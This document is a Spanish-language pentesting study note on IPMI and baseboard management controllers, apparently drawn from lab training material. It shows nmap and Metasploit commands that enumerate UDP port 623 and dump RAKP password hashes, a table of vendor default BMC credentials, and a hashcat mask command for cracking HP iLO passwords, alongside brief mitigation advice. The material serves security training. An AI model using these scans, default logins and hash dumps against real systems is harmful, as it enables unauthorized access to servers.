> La **Interfaz de Gestión de Plataforma Inteligente** (IPMI, por sus siglas en inglés) es un conjunto de especificaciones estandarizadas para sistemas de gestión de hardware utilizados para la administración y monitoreo de sistemas. Funciona como un subsistema autónomo e independiente del BIOS, la CPU, el firmware y el sistema operativo subyacente del host.

IPMI proporciona a los administradores de sistemas la capacidad de gestionar y monitorear sistemas incluso cuando están apagados o en un estado no operativo. Opera utilizando una conexión de red directa al hardware del sistema y no requiere acceso al sistema operativo mediante una shell de inicio de sesión.

IPMI también se puede usar para realizar actualizaciones remotas en los sistemas sin necesidad de acceso físico al host de destino. Se utiliza principalmente de tres maneras:

- **Antes de que el sistema operativo se haya iniciado** para modificar configuraciones del BIOS.
- **Cuando el host está completamente apagado**.
- **Acceso al host después de un fallo del sistema**.

El protocolo **IPMI** fue publicado por primera vez por **Intel** en 1998 y ahora es compatible con más de 200 proveedores de sistemas, incluidos **Cisco, Dell, HP, Supermicro, Intel** y más. Los sistemas que utilizan la versión **IPMI 2.0** pueden ser administrados a través de **serial over LAN**, lo que permite a los administradores de sistemas ver la salida de la consola en banda. Para funcionar, IPMI requiere los siguientes componentes:

- **Baseboard Management Controller (BMC)**: Un microcontrolador y componente esencial de un sistema IPMI.
- **Intelligent Chassis Management Bus (ICMB)**: Una interfaz que permite la comunicación entre chasis.
- **Intelligent Platform Management Bus (IPMB)**: Extiende el BMC para permitir una mayor comunicación.
- **IPMI Memory**: Almacena información como los registros de eventos del sistema, datos de almacenes de repositorios y más.
- **Interfaces de comunicación**: Interfaces locales del sistema, interfaces seriales y LAN, ICMB y PCI Management Bus.

### Footprinting al servicio

IPMI se comunica a través del puerto **623 UDP** y permite la gestión remota de servidores mediante **Baseboard Management Controllers (BMCs)**. Los BMCs son sistemas embebidos que se conectan a la placa base del servidor y proporcionan acceso completo para monitorear, reiniciar, apagar o reinstalar el sistema operativo, lo que equivale a tener acceso físico al sistema. Muchos BMCs, como **HP iLO**, **Dell DRAC** y **Supermicro IPMI**, exponen una consola web y acceso remoto mediante **Telnet** o **SSH**. El acceso a un BMC es crítico, ya que permite un control total sobre el hardware del servidor. 

#### Utilizando nmap

Podemos utilizar el script NSE `ipmi-version` para hacer footprinting al puerto 623 mediante UDP:

```shell-session
amr251@htb[/htb]$ sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local

Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 21:48 GMT
Nmap scan report for ilo.inlanfreight.local (172.16.2.2)
Host is up (0.00064s latency).

PORT    STATE SERVICE
623/udp open  asf-rmcp
| ipmi-version:
|   Version:
|     IPMI-2.0
|   UserAuth:
|   PassAuth: auth_user, non_null_user
|_  Level: 2.0
MAC Address: 14:03:DC:674:18:6A (Hewlett Packard Enterprise)

Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
```

#### Usando metasploit

```shell-session
msf6 > use auxiliary/scanner/ipmi/ipmi_version 
msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_version) > show options 

Module options (auxiliary/scanner/ipmi/ipmi_version):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BATCHSIZE  256              yes       The number of hosts to probe in each set
   RHOSTS     10.129.42.195    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      623              yes       The target port (UDP)
   THREADS    10               yes       The number of concurrent threads


msf6 auxiliary(scanner/ipmi/ipmi_version) > run

[*] Sending IPMI requests to 10.129.42.195->10.129.42.195 (1 hosts)
[+] 10.129.42.195:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) 
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Durante un pentesting interno, a menudo encontramos BMCs donde los administradores no han cambiado la contraseña por defecto. Algunas contraseñas únicas para tener a mano incluyen:

| Producto        | Usuario       | Contraseña                                                                |
| --------------- | ------------- | ------------------------------------------------------------------------- |
| Dell iDRAC      | root          | calvin                                                                    |
| HP iLO          | Administrator | randomized 8-character string consisting of numbers and uppercase letters |
| Supermicro IPMI | ADMIN         | ADMIN                                                                     |
### Configuración peligrosa

Si las credenciales por defecto no funcionan para acceder a un BMC, podemos recurrir a un fallo en el protocolo RAKP en IPMI 2.0. Durante el proceso de autenticación, el servidor envía un hash SHA1 o MD5 salado de la contraseña del usuario al cliente antes de que se produzca la autenticación. Esto puede ser aprovechado para obtener el hash de la contraseña para cualquier cuenta de usuario válida en el BMC. Estos hash de contraseñas se pueden descifrar fuera de línea mediante un ataque de diccionario utilizando el modo Hashcat 7300. En el caso de que un HP iLO utilice una contraseña predeterminada de fábrica, podemos utilizar este comando de ataque de máscara Hashcat `hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u` que intenta todas las combinaciones de letras mayúsculas y números para una contraseña de ocho caracteres.

No existe una «solución» directa a este problema porque el fallo es un componente crítico de la especificación IPMI. Los clientes pueden optar por contraseñas muy largas y difíciles de descifrar o implementar reglas de segmentación de red para restringir el acceso directo a los BMC. Es importante no pasar por alto IPMI durante las pruebas de penetración internas (lo vemos durante la mayoría de las evaluaciones) porque no sólo podemos a menudo obtener acceso a la consola web BMC, que es un hallazgo de alto riesgo, sino que hemos visto entornos en los que se establece una contraseña única (pero descifrable) que luego se reutiliza en otros sistemas. En una de estas pruebas de penetración, obtuvimos un hash de IPMI, lo desciframos fuera de línea utilizando Hashcat, y fuimos capaces de SSH en muchos servidores críticos en el entorno como usuario root y obtener acceso a las consolas de gestión web para varias herramientas de monitorización de red.

### Volcando hashes con Metasploit

```shell-session
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options 

Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):

   Name                 Current Setting                                                    Required  Description
   ----                 ---------------                                                    --------  -----------
   CRACK_COMMON         true                                                               yes       Automatically crack common passwords as they are obtained
   OUTPUT_HASHCAT_FILE                                                                     no        Save captured password hashes in hashcat format
   OUTPUT_JOHN_FILE                                                                        no        Save captured password hashes in john the ripper format
   PASS_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line
   RHOSTS               10.129.42.195                                                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                623                                                                yes       The target port
   THREADS              1                                                                  yes       The number of concurrent threads (max one per host)
   USER_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line



msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

[+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e
[+] 10.129.42.195:623 - IPMI - Hash for user 'ADMIN' matches password 'ADMIN'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

